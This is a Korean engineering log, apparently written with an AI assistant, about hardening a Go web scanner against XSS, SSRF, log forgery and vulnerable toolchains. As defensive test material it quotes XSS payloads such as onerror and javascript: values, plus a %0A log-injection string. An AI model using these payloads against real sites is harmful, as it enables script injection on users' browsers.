**① 기본값과 같은 값으로 시험하면 아무것도 증명하지 못한다.**

`TestGetStopsAfterMaxHops` 에 `f.MaxHops = 3` 을 썼는데 **기본값도 3** 이었다. 설정을 읽는 코드를 통째로 죽여(항상 기본값 3) 봐도 테스트가 그대로 통과했다. 값이 같으니 구별할 방법이 없다.

```
f.MaxHops = 3   설정이 먹어도 3, 무시돼도 3   → 아무것도 증명 못 함
f.MaxHops = 2   설정이 먹으면 2, 무시되면 3   → 구별된다
```

**② 같은 리터럴을 세 번 적게 만들면 세 번 틀릴 수 있다.**

`203.0.113.7` 을 `203.0.133.7` 로 치는 실수가 **두 교시 연속 같은 자리에서** 났다. 두 번 같은 곳에서 미끄러지면 손이 아니라 **구조**가 문제다 — 같은 주소를 `fixedLookup`·`dial` 비교·`want` 세 군데에 손으로 적게 만든 설계가 원인이었다. `const first, second = …` 로 한 번만 적게 바꿨다.

같은 뿌리에서 나온 교훈이 하나 더 있다. 첫 실패 때 메시지가 이랬다.

```
검증한 주소로 안 갔다: [203.0.113.7:80]
```

**맞는 값이 찍혀 있어서** 눈이 미끄러진다. 틀린 쪽(비교 대상)은 화면에 없었다. **비교 실패의 증거는 두 값 다**이다 — 이 프로젝트가 발견에 증거를 붙이는 것과 같은 이야기다.

---

### 12.28 이스케이프는 값의 성질이 아니라 자리의 성질이다 (50교시)

우리 `Evidence` 에는 원본 마크업이 그대로 들어 있다(`<img onerror=…>`, `href=&#106;avascript:alert(1)`). 결과 페이지에 그냥 뿌리면 **우리 스캐너가 우리 사이트에 XSS 를 심는다.**

같은 값 `<img src=x onerror=alert(1)>` 를 `html/template` 의 여섯 자리에 넣어 쟀다.

```
HTML 본문         <p>&lt;img src=x onerror=alert(1)&gt;</p>
속성(따옴표)       title="&lt;img src=x onerror=alert(1)&gt;"
속성(따옴표 없음)   title=&lt;img&#32;src&#61;x&#32;onerror&#61;alert(1)&gt;
href URL         href="%3cimg%20src=x%20onerror=alert%281%29%3e"
script 안        var e = "<img src=x onerror=alert(1)>";
style 안         content: "\3cimg src=x onerror=alert\28 1\29\3e "
```

**전부 다르다.** 따옴표 없는 속성은 공백 하나로 새 속성을 붙일 수 있어 공백과 `=` 까지 이스케이프한다. `strings.ReplaceAll(s, "<", "&lt;")` 같은 함수 하나로는 원리적으로 안 된다 — **어느 자리에 들어가는지 모르면 올바른 이스케이프를 고를 수 없다.** `html/template` 은 템플릿을 파싱해 각 `{{.}}` 의 문맥을 알아낸 뒤 맞는 이스케이프를 고른다. `text/template` 은 아무것도 하지 않는다.

href 에서는 `javascript:alert(1)`, `&#106;avascript:alert(1)`(문자 참조까지 풀어서 본다), `data:text/html,…` 가 전부 `#ZgotmplZ` 로 바뀐다.

**`html/template` 이 못 지켜주는 곳을 재 봤다.**

| 자리 | 결과 |
|---|---|
| `<svg><text>{{.}}` · `<foreignObject>` | 이스케이프됨 |
| `<!-- {{.}} -->` | **주석을 통째로 삭제** |
| `<{{.}}>` (태그 이름) | `&lt;img …>` — 텍스트가 된다 |
| `<div {{.}}>` (속성 이름) | `<div ZgotmplZ>` |
| **`template.HTML(v)`** | **전부 우회** |
| **템플릿 문자열을 사용자 입력으로 만들기** | **전부 우회** |

위험한 건 마지막 둘뿐이고, **둘 다 우리가 자초해야만** 일어난다. 특히 마지막은 이스케이프의 실패가 아니라 **공격자에게 템플릿을 쓰게 한 것**이다. 그래서 템플릿 본문은 상수다.

**대상 URL 을 링크로 만들지 않았다.** `html/template` 이 `javascript:` 를 막으니 기술적으로는 안전하지만, 이 페이지는 악성일 수 있는 사이트에 대한 보고서다. 클릭 가능하게 만들면 사용자를 그리로 보낸다.

**`<meta charset>` 은 앞 1024바이트 안에** 둔다. 브라우저는 거기서만 찾고, 늦으면 문자셋을 추측한다 — UTF-7 우회의 전제다. **CSP(`default-src 'none'`)는 2차 방어선**이다. 인라인 이벤트 핸들러도 막지만, **브라우저 동작은 여기서 검증할 수 없다** — 테스트가 볼 수 있는 건 그 줄이 있는지뿐이다.

**자기 스캔 테스트.** 무엇이 위험한지는 이미 규칙 23종이 안다. 안전 기준을 새로 만들지 않는다.

```
악성 페이지 → 스캔 → 리포트 생성 → 그 리포트를 다시 스캔 → 발견 0건이어야 한다
```

`html/template` → `text/template` 변이와 `{{.Evidence}}` 를 `template.HTML` 로 감싼 변이를 **둘 다** 잡았다(`LOW inline-handler "<img onerror=…>"`).

**살아남은 변이가 곧 빠진 테스트는 아니다.** 변이 6개 중 3개가 살아남았다.

| 살아남은 변이 | 판단 |
|---|---|
| charset 선언 삭제 | **진짜 구멍** → 위치까지 단언하는 테스트 추가 |
| 증거를 `<code>` 밖으로 | 이스케이프 결과가 **똑같다** — 둘 다 HTML 본문 문맥 |
| URL 을 `<code>` 밖으로 | 같음 |

`<code>` 는 보안과 무관한 표현 선택이다. 여기에 테스트를 붙이면 마크업 모양을 고정시켜, 디자인을 바꿀 때마다 무관한 테스트가 깨진다. **변이 검사는 후보를 내놓을 뿐이다.** 살아남은 변이마다 *"이게 깨지면 무엇이 위험해지는가"* 를 묻고, 답이 "아무것도"면 테스트를 넣지 않는다. 킬 비율을 목표로 삼으면 족쇄가 쌓인다.

---

### 12.29 페이지는 누가 그리는가 — 배포 구조를 먼저 물었어야 했다 (51·52교시)

51교시에서 `web` 패키지와 `cmd/webscan` 을 만들었다. Go 가 **폼 페이지와 결과 페이지를 직접 서빙**하는 구조였다. 신뢰 경계에서 할 일 — 들어오는 것은 좁히고(파싱 전 `MaxBytesReader` · URL 2048자 · `r.Context()` 전달), 나가는 것은 해석을 못박는다(CSP·nosniff 를 404·405·오류 응답까지 **모든 응답**에) — 을 정리했고, **오류 상세를 내보내지 않기로** 했다. `intranet.corp(10.1.2.3) 로는 접속하지 않는다` 를 돌려주면 우리 서버가 내부 DNS 를 대신 조회해 주는 창구가 된다.

그런데 사용자가 물었다 — *페이지는 my_homepage 가 그리고, 이 Go 프로젝트는 Docker 로 띄워 내부 통신만 하는데, API 만 뚫으면 되지 않나? `cmd/webscan` 은 왜 만들었나?*

**내 가정이 틀렸다.** 기록된 목표("포트폴리오 페이지에서 URL 을 입력받아 스캔하고 결과를 보여준다")를 보고 Go 가 그 페이지 자체라고 가정했다. 웹 계층을 짜기 전에 **배포 구조를 먼저 물었어야 했다.** my_homepage 를 읽어 확인한 구조:

```
브라우저 ─443─▶ nginx ─┬─ /            정적 html/index.html
                       ├─ /api/…       ▶ api:8000 (FastAPI, expose 만)
                       └─ /api/scan    ▶ sha:8080 (이 Go 프로젝트, expose 만)
```

그래서 Go 는 **JSON API** 가 됐고 `report/`·폼 페이지는 삭제했다. 하지만 "API 만 뚫으면 끝"은 아니다. **책임은 사라지지 않고 옮겨 간다.**

| 51교시에서 한 것 | 새 구조에서 |
|---|---|
| SSRF 방어 | Go 에 그대로 — 그리고 **더 중요해진다** |
| 입력 상한 · context · 오류 상세 숨김 · 최종 URL | Go API 에 그대로 |
| **출력 이스케이프(50교시)** | **`index.html` 의 JavaScript 로** |
| CSP·보안 헤더 | nginx 로 |
| 남용 방지 | nginx `limit_req` 로 — Go 는 nginx 의 IP 만 본다 |

**Docker 안에서 SSRF 방어가 더 중요한 이유**: 같은 compose 네트워크의 서비스 이름은 `172.18.0.x`(사설), 호스트 게이트웨이는 `172.17.0.1`(사설), 내장 DNS 는 `127.0.0.11`(루프백)으로 풀린다. 47교시 판정이 이미 전부 막는다. **문자열 검사였다면 `http://api:8000/` 은 그냥 통과했다.**

**출력 이스케이프가 이미 위험한 패턴 위로 옮겨 간다.** `index.html` 은 지금 API 데이터를 템플릿 리터럴로 `innerHTML` 에 이스케이프 없이 넣는다(`repoCardHtml` · `postCardHtml`). 지금 데이터는 본인의 GitHub·티스토리라 위험이 낮다. 그러나 스캔 결과를 같은 방식으로 붙이면 `evidence` — **아무 방문자가 고른 아무 페이지의 문자열** — 가 suseong.org 에서 실행된다.

**증거는 JSON 에 원본 그대로 넣는다.** 이스케이프는 값이 아니라 그려지는 자리의 일이다(§12.28). 여기서 `&lt;` 로 바꿔 보내면, 받는 쪽이 `textContent` 로 올바르게 그릴 때 `&lt;img` 가 글자로 찍힌다. 대신 `encoding/json` 은 `<` 를 `<` 로 써서 **응답 바이트에는 날것의 `<` 가 없다.**

**JSON 형식만 받는다.** `application/x-www-form-urlencoded` 는 아무 사이트의 `<form>` 이 방문자 브라우저를 시켜 보낼 수 있다. `application/json` 은 교차 출처면 브라우저가 사전 확인(preflight)을 먼저 하고, 허락하지 않았으니 거기서 막힌다.

**빈 결과도 `[]`** — Go 의 nil 슬라이스는 JSON `null` 이 되고, 받는 JS 는 `findings.length` 에서 터진다.

**정렬을 한 곳으로.** 정렬이 CLI 안에만 있어서, 결과를 보여주는 곳이 둘로 늘자 웹은 규칙 실행 순서 그대로 내보냈다(네이버 스캔에서 LOW 가 MEDIUM 위에 있었다). `scanner.SortBySeverity` 로 내렸다.

이번에 배운 것들:

**① 처음 쓴 정렬 테스트는 아무것도 지키지 못했다.** 표본의 LOW 발견이 `inline-handler` 였는데, 집계 규칙은 문서를 다 읽은 뒤(`Finish`)에 발견을 낸다. 그래서 **정렬하기 전부터** HIGH 가 첫 줄이었고 정렬 호출을 지워도 통과했다. 정렬 전 순서가 MEDIUM → HIGH 인 표본으로 바꿨다.

**② 동등 변이.** 51교시에서 결과의 `Content-Type` 설정을 지워 봤더니 `net/http` 가 본문을 보고 **똑같은 값**을 채웠다. 동작이 같으니 어떤 테스트로도 구별할 수 없다. 코드에는 남기고(우리가 정할 값이다) 테스트는 요구하지 않는다. `SliceStable → Slice` 도 비슷하다 — `sort.Slice` 는 원소 12개까지는 안정적으로 동작하고 13개부터 흔들린다. 흔들려도 같은 심각도 안에서 순서만 바뀔 뿐이라 테스트를 넣지 않았다.

**③ 오타 둘이 서로를 가렸다.** 테스트 경로 `/ap/scan`(→ 404) 때문에 대부분의 테스트가 핸들러에 도착하지 못했고, 그 뒤에 코드의 `"appictaion/json"`(→ 올바른 요청도 전부 415)이 숨어 있었다. 경로를 거치지 않는 테스트 하나만 다르게 실패했다. **실패를 한 원인으로 묶기 전에 다르게 실패하는 테스트가 있는지 본다.**

**④ 전부 거절하는 코드는 "나쁜 것을 거절하는가" 테스트를 통과한다.** `TestScanRequiresJSONContentType` 은 오타가 있는 동안에도 통과했다. 올바른 요청이 200 을 받는지 묻는 반대 방향 테스트가 잡았다. §5 의 "두 방향을 같이 건다"와 같은 원칙이다 — 이번엔 *아무것도 안 받는 API* 가 만점을 받을 뻔했다.

**⑤ 약속은 따로 적는다.** `Referrer-Policy`·`application/json` 오타가 드러난 건 코드와 테스트가 **각자 따로** 적었기 때문이다. 상수 하나로 묶으면 둘이 같이 틀리고 테스트는 통과하는데, 브라우저는 모르는 헤더라 무시한다. 49교시의 "같은 리터럴은 한 번만"은 **테스트 안에서만 쓰는 설정값** 이야기였다.

---

### 12.30 실행 이미지에는 필요한 것만 — 무엇이 필요한지는 재야 안다 (53교시)

빌드 단계(`golang:1.27-alpine`, 373MB — 컴파일러·셸·패키지 관리자)와 실행 단계(`scratch`, 0MB)를 나눴다. 실행 이미지에 셸도 패키지 관리자도 없으면, 적대적 입력을 다루는 파서가 뚫리더라도 **컨테이너 안에 쓸 도구가 없다.**

문제는 "필요한 것"을 하나라도 빠뜨렸을 때다. 실제 컨테이너로 쟀다.

| | 크기 | https | http |
|---|---|---|---|
| `scratch` — 바이너리만 | 8.72MB | **502** | 200 |
| `scratch` + 인증서 한 줄 | 9.07MB | 200 | 200 |
| `distroless/static:nonroot` | 14.9MB | 200 | 200 |

첫 판은 빌드도 되고 서버도 뜨고 http 도 된다. **https 만 조용히 실패한다.** 원인은 `x509: certificate signed by unknown authority` — `scratch` 에는 `/etc/ssl/certs` 가 없다. 그리고 48교시 이후 테스트는 전부 가짜 `dial` 로 돌기 때문에 **이 실패를 볼 수 없다.** 실제 컨테이너로 실제 https 사이트에 요청해야만 드러난다. 51교시에 오류 상세를 숨기기로 해서 응답만으로는 원인을 알 수 없었다는 것도 드러났다 — 운영에는 서버 로그가 필요하다.

인증서 한 줄 판을 골랐다. distroless 도 맞는 답이지만, `COPY … ca-certificates.crt` 한 줄이 **"이 프로그램은 https 인증서가 필요하다"를 코드에 드러낸다.** 인증서는 빌드 이미지를 새로 받을 때만 갱신되니 주기적으로 다시 빌드해야 한다.

**컨테이너 안에서 더 쟀다.**

- `USER 65532:65532` → 호스트에서 본 프로세스 UID 65532. `scratch` 에는 `/etc/passwd` 가 없어 이름이 아니라 숫자로 준다.
- 컨테이너 안에서 `127.0.0.1` 로 열면 **로그에는 `http://127.0.0.1:8080` 이 멀쩡히 찍히는데 아무도 닿지 못한다**(curl exit 52). 컨테이너 안의 루프백은 그 컨테이너 자신이다. `0.0.0.0` 으로 열고, 밖으로 노출하지 않는 일은 compose 의 `expose` 가 맡는다.
- **Docker 네트워크 안의 SSRF — 대조군.** my_homepage 의 `api` 서비스를 흉내 낸 nginx 를 같은 네트워크에 두고, 방어를 끈 이미지를 따로 만들었다. `http://api/`(172.18.0.2) → **방어 켬 502, 방어 끔 200**(내부 페이지를 실제로 가져와 스캔했다). 502 가 네트워크 탓이 아니라 우리 방어 때문이라는 증거다. 반면 `host.docker.internal`(→ `192.168.65.254`, 이 Mac)과 `172.17.0.1` 은 **방어를 꺼도 502** 였다 — 그 포트에서 듣는 서버가 없었다. 두 주소는 사설 대역이라 판정 표로 막히지만, 대조군으로 증명한 것은 `api` 하나뿐이다.

**`.dockerignore` — Docker 는 `.gitignore` 를 읽지 않는다.** 없이 `COPY . .` 하면 컨텍스트가 40.8MB 였다(`.git` · 실제 사이트 50곳에서 받은 `testdata/live` · macOS 바이너리 · `old_c_files`). 허용 목록으로 쓰니 300KB. 빼야 할 것을 나열하면 나중에 생긴 파일이 빠지므로 **넣을 것을 나열한다** — URL 을 기본 거부로 다룬 것과 같은 원리다.

**정직하게 적은 주석 하나.** `CGO_ENABLED=0` 은 `golang:alpine` 에서 이미 기본값이 0 이다(C 컴파일러가 없다). 지금은 결과를 바꾸지 않고, 빌드 이미지를 바꿔도 결과가 같게 하려고 적는다. `-trimpath -ldflags="-s -w"` 는 14.2MB → 9.07MB.

**Go 버전 — 내 실수.** 처음 Dockerfile 에 `golang:1.24.6-alpine` 을 적었다. `go.mod` 과 로컬 설치 버전에 맞춰 "테스트한 버전 = 배포하는 버전"을 지키려 했지만, **그 버전이 아직 보안 패치를 받는지는 확인하지 않았다.** 1.24 줄은 지원이 끝나 있었다.

```
go1.24.6 으로 빌드한 webscan   govulncheck -mode=binary → 우리 코드가 호출하는 표준 라이브러리 취약점 26건
go1.27.1 으로 빌드한 webscan   → 0건
```

영향받는 패키지는 `net/url` · `net/http` · `crypto/tls` · `crypto/x509` · `net` — `fetcher` 가 **공격자가 고른 URL 과 응답**을 다루는 바로 그 경로였다. CI 도 `go-version-file: go.mod` 을 읽어 1.24.6 으로 돌고 있었다.

`go.mod` 을 `go 1.27.1` 로 올렸다. 로컬은 `GOTOOLCHAIN=auto` 라 설치된 Go 가 1.24.6 이어도 이 모듈 안에서는 1.27.1 을 자동으로 받아 쓴다(공식 golang 이미지는 `local` 이라 자동 전환이 안 된다 — 컨테이너에서 둘 다 확인). Dockerfile 은 **`golang:1.27-alpine` 처럼 줄로** 적는다. 정확한 패치를 고정한 결과가 "고정된 채 26건이 쌓인 것"이었으므로, 재빌드 때 패치를 따라가게 하고 최소 버전은 `go.mod` 이 보장한다. 1.27.1 에서 테스트 638개가 그대로 통과했고, 실제 이미지에서 꺼낸 바이너리도 0건이었다.

**측정하다 한 실수.** 태그가 있는지 "조회만" 하겠다고 하고 `docker run --pull=missing` 으로 버전을 찍어, 이미지 네 개를 실제로 내려받았다. 쓸 것만 남기고 지웠다.

---

### 12.31 넘겨줄 문서도 돌려 보고 넘긴다 — 연동 명세

my_homepage 는 사용자가 나중에 직접 작업한다. 그래서 이 저장소에서 **명세**(`docs/INTEGRATION.md`)를 만들었다. 명세를 받는 쪽은 적힌 설정을 그대로 믿고 붙여 넣는다. 그래서 명세 속 설정과 코드를 **my_homepage 와 같은 구성(nginx + api + sha)으로 compose 를 띄워** 끝에서 끝까지 돌렸다.

측정이 명세 내용을 바꾼 곳:

- **오류 응답은 JSON 이 아니다.** SHA 가 돌려주는 오류는 JSON 이지만, nginx 가 먼저 막은 413·429 는 **HTML**, Go `ServeMux` 의 404·405 는 **text/plain** 이었다. 호출 쪽이 `res.json()` 을 바로 부르면 오류 처리 자체가 터진다 → 호출 예시가 `Content-Type` 을 먼저 본다.
- **속도 제한은 방문자 단위여야 한다.** Cloudflare 뒤에서는 `$remote_addr` 가 Cloudflare 서버다. `real_ip_header CF-Connecting-IP` 로 복원하고, `set_real_ip_from` 으로 믿을 연결을 좁혔다. 확인: 믿는 설정에서 같은 방문자 8회는 4회 뒤 429, 서로 다른 방문자 8명은 전부 통과. 믿지 않는 설정에서 헤더를 8가지로 위조하면 **위조를 무시하고** 4회 뒤 429.
- **CSP 헤더가 두 개 붙는다.** `/api/scan` 응답에는 SHA 의 `default-src 'none'` 과 nginx 의 페이지용 정책이 함께 온다. 브라우저는 둘 다 적용하니 문제는 없지만, 모르고 보면 설정 실수로 오해한다.
- **우리 스캐너로 지금의 `index.html` 을 검사했다.** `marked` 를 버전 고정·SRI 없이 CDN 에서 불러오는 것이 `sri-missing` 으로 잡혔다. 명세의 "함께 볼 곳"에 넣었다.
- **그리는 쪽 예시는 대조군과 함께 검증했다.** jsdom 에서 `textContent` 방식은 위험 요소를 0개 만들었고, 지금의 카드 함수와 같은 `innerHTML` 방식은 `<img onerror>`·`<svg onload>` 를 실제 요소로 만들었다.
- **Cloudflare 뒤에서 SHA 는 원서버 IP 를 드러낸다.** 코드로 막을 수 없어 명세에 따로 절을 두었다. 대응은 원서버 방화벽을 Cloudflare 대역으로 좁히거나, SHA 의 나가는 요청만 다른 IP 로 보내는 것이다.

**문서로 옮겨 적는 단계도 검증했다.** 명세 파일에서 코드 블록을 뽑아 다시 돌렸다. nginx 블록은 검증한 파일과 완전히 같았고 `nginx -t` 를 통과했다. compose 블록은 `docker compose config` 를 통과했다. `renderScan` 은 jsdom 테스트를 다시 통과했다. §6 에 적어 둔 "449·24·31 셋 다 옮겨 적는 단계에서 틀렸다"를 설정 파일에도 적용한 것이다.

**측정하다 또 한 실수.** 셸 변수 `C="curl -sk --resolve …"` 를 `$C` 로 불렀다가 **zsh 가 공백으로 쪼개지 않아** 첫 검증이 전부 `command not found` 로 끝났다. CLAUDE.md §1 에 이미 적어 둔 함정이다. 셸 함수로 바꿔 다시 돌렸다.

명세에는 **확인하지 못한 것**도 표로 남겼다. CSP 가 브라우저에서 실제로 무엇을 막는지(브라우저 없음), `add_header` 상속 동작(nginx 문서에 근거, 직접 재지 않음), `mem_limit`·`rate` 의 적정성(부하를 걸지 않음)이 그렇다.

---

### 12.32 로그는 운영자의 증거이자 새 유출 경로다 (54교시)

51교시에 오류 상세를 응답에서 숨겼다(내부 DNS 조회 창구가 되지 않게). 대가로 502 의 원인을 볼 곳이 없었다 — 53교시에 `scratch` 이미지가 https 만 실패했을 때도 응답으로는 원인을 알 수 없었다. 로그가 그 자리를 채운다. 그런데 로그는 **사용자가 넣은 문자열이 흘러드는 또 하나의 출력**이다.

**① 오류 문자열에는 사용자가 넣은 URL 이 통째로 들어 있다.**

```
Get "https://user:***@intranet.corp:8443/reset?token=SECRET#frag": intranet.corp(10.1.2.3) 로는 접속하지 않는다: 사설망
```

Go 는 비밀번호만 가린다. 쿼리의 토큰은 그대로다. 사람들은 비밀번호 재설정 링크나 서명된 다운로드 링크를 "안전한가?" 하고 넣어 본다. `err.Error()` 를 로그에 쓰면 그 토큰이 오래 보관되는 곳에 쌓인다.

**② 문자열 없이 종류를 가를 수 있는가.** 시간 초과(`net.Error.Timeout()`)·인증서(`*tls.CertificateVerificationError`)·DNS(`*net.DNSError`)는 타입으로 구별됐다. **차단과 상한 초과는 문자열뿐이었다.** `fetcher` 에 `ErrBlocked`·`ErrTooLarge` 를 두고 `%w` 로 감쌌다. `%v` 는 글자만 붙이고 `%w` 는 원래 값을 품는다 — `http.Client` 를 거쳐 올라와도 `errors.Is` 로 찾아짐을 확인했고, 변이 검사로 `%w`→`%v` 를 잡았다.

**③ 로그 줄은 위조할 수 있다.** 줄바꿈이 든 값을 `log.Printf` 로 쓰면 **로그가 2줄**이 된다. `slog` JSON 핸들러는 1줄로 이스케이프한다. `url.Parse` 는 호스트의 줄바꿈은 거부하지만 **경로의 `%0A` 는 진짜 줄바꿈으로 풀어 준다**(`Path="/a\n{\"status\":200}"`). §12.28 과 같은 이야기다 — 로그도 출력이고, 출력에는 자리에 맞는 이스케이프가 필요하다.

| 남기는 것 | 남기지 않는 것 |
|---|---|
| 상태 · 원인 종류 · scheme · host(포트 포함) · final_host · 발견·참고 수 · 바이트 · ms | 경로 · 쿼리 · 조각 · userinfo · 요청 본문 · **오류 문자열** · 방문자 IP |

host 는 남긴다 — 우리 서버로 어디를 두드리는지(남용)는 host 가 있어야 보인다. 방문자 IP 는 nginx 접속 로그에 있다.

실제 서버와 실제 이미지(`docker logs`)로 확인했다. 토큰·계정·경로·위조용 `%0A` 가 든 URL 을 넣고 로그 전체에서 찾은 결과 전부 0건이었고, 502 는 `blocked`·`dns` 로 기록됐다.

**테스트가 못 지키는 것.** JSON 핸들러를 쓴다는 결정은 `cmd/webscan` 에 있다. `web` 의 테스트는 JSON 핸들러를 직접 끼워 돌기 때문에 누가 텍스트 핸들러로 바꿔도 모른다.

**약속한 필드는 테스트가 지켜야 한다.** 사용자 코드에서 `findings`·`notes`·`bytes` 를 남기는 줄이 빠졌는데 테스트가 통과했다. 내가 드린 테스트가 네 필드만 봤기 때문이다. 필드가 빠진다고 보안이 위험해지진 않지만(§12.28 기준), 명세가 이 필드를 약속하므로 운영자는 그 설명을 믿고 로그를 읽는다. 문서에 적은 약속은 테스트가 지킨다.

---

### 12.33 취약점은 코드가 그대로여도 생긴다 — CI 에 govulncheck

1.24.6 에서 쌓인 26건(§12.30)은 우리가 코드를 바꿔서 생긴 게 아니다. 시간이 지나며 새로 알려진 것이다. 그래서 푸시할 때만 검사해서는 부족하고, CI 의 **주간 schedule** 에서도 `govulncheck` 를 돌린다.

`setup-go` 는 `go.mod` 에 적힌 버전을 설치한다. 나중에 새 패치 릴리스가 표준 라이브러리 취약점을 고치면 이 잡이 **지금 버전에 남은 취약점을 발견해 실패**한다. 그 빨간불이 "go.mod 을 올리라"는 알림이다. 도구는 `@v1.8.0` 으로 고정했다 — 취약점 목록은 실행할 때마다 온라인에서 받으므로 도구를 고정해도 목록이 낡지 않는다(Go 버전 고정과 다른 경우다).

검증은 대조군과 함께 했다. 지금 코드는 종료 코드 0, 1.24.6 으로 빌드한 바이너리는 26건에 0 이 아닌 종료 코드. `actionlint` 는 수정안에 0, `runs-on` 을 `runs_on` 으로 틀린 대조군에 1. GitHub Actions 첫 실행도 `No vulnerabilities found.` 였다.

**측정하다 틀린 곳이 둘.** 첫 대조군은 저장소 `go.mod` 이 이미 1.27.1 을 요구해 1.24.6 으로 빌드조차 안 됐다 — 찍힌 실패는 취약점 때문이 아니었다. 그리고 처음 찍힌 "actionlint 문제 없음"은 거짓이었다. git 저장소가 아니어서 검사를 시작도 못 했는데 `도구 | head && echo 통과` 에서 **파이프의 종료 코드가 head 것**이라 실패가 가려졌다. 대조군(일부러 틀린 입력)을 함께 돌리지 않았다면 모르고 넘어갔다.

덤 — `govulncheck` 는 취약점을 찾으면 3 을 돌려주지만 `go run` 을 거치면 1 이 된다(설치한 바이너리로 3, `go run` 으로 1). CI 는 0 이 아니면 실패로 보므로 영향은 없다.

---

### 12.34 보류 항목을 측정으로 닫는다 — foster parenting (55교시)

보류 표에 `foster parenting | 트리 필요, 보안 영향 불명` 이라고 적혀 있었다. **"영향 불명"은 결정을 미룬 상태가 아니라 재지 않은 상태다.**

`<table>` 안에 오면 안 되는 내용을 브라우저는 표 앞으로 옮긴다(foster parenting). 우리는 트리를 만들지 않으므로, 물음은 하나였다 — **표가 폼과 입력을 갈라놓을 때 우리 판정이 브라우저와 달라지는가.**

대조군으로 `golang.org/x/net/html` 을 썼다. 같은 명세를 구현한 다른 구현이라 "명세대로면 이렇게 된다"를 보여준다(스크래치패드에서만 받았고 저장소에는 넣지 않았다).

| 입력 | 참조 파서의 트리 | 우리 |
|---|---|---|
| `<table><form action=E><input type=password></form></table>` | 입력이 표 밖으로(`body > input`), 폼은 표 안 | HIGH |
| `<table><form action=E></table><input type=password>` | 폼은 표 안, 입력은 표 뒤 형제 | HIGH |
| `<form action=E><table><input type=password></table></form>` | 입력이 표 앞으로 옮겨져 폼의 자식 | HIGH |
| 셀 안의 폼·입력 | `td > form > input` | HIGH |
| `<form action=E></form><input type=password>` | 형제, 폼은 이미 닫힘 | 발견 없음 |
| `<input form="f">` 원격 연결 | 형제 | HIGH |

**여섯 경우 전부 일치했다.**

```
foster parenting 은 노드의 자리를 바꾼다. 폼 소속은 자리로 정해지지 않는다.
브라우저는 form 요소 포인터로 묶고, 우리 openStack 도 같은 포인터를 들고 있다.
우리 규칙은 "어디에 있는가"가 아니라 "어느 폼 소속인가"를 묻는다 — 그래서 영향이 없다.
```

측정만 하고 끝내면 다음에 스택을 손볼 때 조용히 깨진다. `differential_test.go` 에 3건을 고정했다. `</table>` 에서 폼 포인터를 버리는 변이를 넣으면 `표안폼_입력은표뒤` 가 실패하는 것까지 확인했다.

**재면서 드러난 다른 것.** `<svg>` 안의 `<form>`·`<input>` 은 참조 파서에서 `svg:form`·`svg:input` 이다 — HTML 폼이 아니라 제출되지 않는데 우리는 HIGH 를 준다. 오탐이다. 외래 콘텐츠는 §12.14 에서 "다시 논의하지 말 것"으로 닫은 항목이라 **결정을 뒤집지 않고 비용만 기록한다**: 코퍼스 21쪽 중 `<svg>` 는 7쪽에 146회 나오지만 `form`+`password` 가 함께 있는 경우는 0건이었다. `<template>` 안의 폼도 잡는데, 그건 스크립트가 복제하면 진짜 폼이 되므로 그대로 둔다.

덤으로 **HIGH 규칙은 8종이 아니라 10종**이었다. 코드에서 `Finding{…Severity: High}` 를 다시 세어 확인했고, 보류 표의 낡은 숫자를 고쳤다. 기록의 숫자도 측정 대상이다(§12.9 와 같은 실수다).

---

### 12.35 무료 호스팅이 같은 조직으로 뭉쳐 있었다 — eTLD+1 표 (56교시)

보류 표에 `eTLD+1 표 확장 | 기계적, 미탐 방향` 이라고 적어 뒀지만, **무엇을 넣을지는 기계적이지 않다.** 전체 PSL 은 9천 줄이 넘고 주기적으로 바뀐다. 외부 의존성 0 원칙 때문에 통째로 들고 오지 않기로 했으니, 어떤 24개를 어떤 39개로 바꿀지는 근거가 있어야 한다.

대조군은 전체 PSL 을 담은 `golang.org/x/net/publicsuffix`(스크래치패드에서만). 대상은 **규칙이 실제로 비교하는 호스트들**이다 — 코퍼스·실측 71쪽 안의 모든 http(s) 호스트, `tools/sites.txt`, C-TAS 악성 도메인 918개. 전부 문자열 처리이고 접속은 하지 않았다.

```
호스트 3,141개 중 555개가 우리 판정과 어긋났다.

github.io 240 · vercel.app 214 · netlify.app 47 · framer.app 12   ← 전부 C-TAS 악성 도메인
gov.cn 11 · seoul.kr 7 · cloudfront.net 4 · githubusercontent.com 2 · googleapis.com 2 · org.cn 2
나머지는 1건씩 (edu.sy · iki.fi · my.id · s3.amazonaws.com · execute-api.<지역>.amazonaws.com …)
```

**미탐의 모양이 분명했다.**

```
registrableDomain("victim.github.io")   = "github.io"
registrableDomain("attacker.github.io") = "github.io"
→ isSameOrg = true → 비밀번호가 옆 계정으로 가도 HIGH 가 안 난다
```

C-TAS 에 github.io 호스트가 240개 있다는 것은 이 경로가 실제로 쓰인다는 뜻이다. §12.2 에서 세운 기준이 그대로 적용된다 — SRI·출처 규칙이 묻는 것은 "같은 출처인가"가 아니라 **"우리가 통제하는가"** 이고, `github.io` 아래 다른 계정은 우리가 통제하지 않는다. PSL 의 사설 구역이 정확히 이 목적이다.

**양방향으로 쟀다.**

| 방향 | 결과 |
|---|---|
| 오탐 — 정상 코퍼스 21쪽 | 발견 수 **변화 없음** |
| 미탐 — `victim.github.io` → `attacker.github.io` · vercel 다른 배포 · `seoul.kr` | 0건 → **HIGH 1건씩** |
| 대조군 — 같은 계정 안에서 전송 | 0건 그대로 |

**1건짜리는 넣지 않았다.** 손으로 관리하는 표에 근거 없이 줄을 늘리면 다음 사람이 무엇이 왜 있는지 모른다. `execute-api.<지역>.amazonaws.com` 처럼 지역마다 갈라지는 것도 뺐다 — 한 줄로 끝나지 않고, 빠뜨린 지역이 그대로 구멍이 된다. 표의 한계는 여전히 **미탐 방향**이다(§12.2).

테스트에 `{"victim.github.io", "victim.github.io", true}` 를 함께 넣었다. "남남으로 본다"만 시험하면 **전부 남남으로 보는 코드**가 통과한다 — §12.29 ④와 같은 자리다. 개별 접미사를 지우거나 표를 통째로 비우는 변이 5건은 전부 잡혔다.

---

### 12.36 만들지 않기로 한 것도 측정으로 정한다 — 단일 체계 위조 (56교시 뒤)

보류 항목 마지막은 `аррӏе`(키릴 문자로 apple 을 흉내 낸 것) 같은 **단일 체계 위조**였다. 지금 `mixed-script-host` 는 한 라벨 안에 여러 문자 체계가 섞였을 때만 잡으므로, 키릴만으로 만든 위조는 못 잡는다. 만들려면 유니코드 confusables 표를 손으로 들고 있어야 한다.

만들기 전에 **대상이 있는지** 쟀다.

| 데이터 | punycode 라벨 | 문자 체계 |
|---|---|---|
| C-TAS 악성 도메인 918개 | 63개 | **전부 한글 단일** (키릴 0 · 그리스 0) |
| 코퍼스·실측 페이지 안의 호스트 2,226개 | **0개** | — |

```
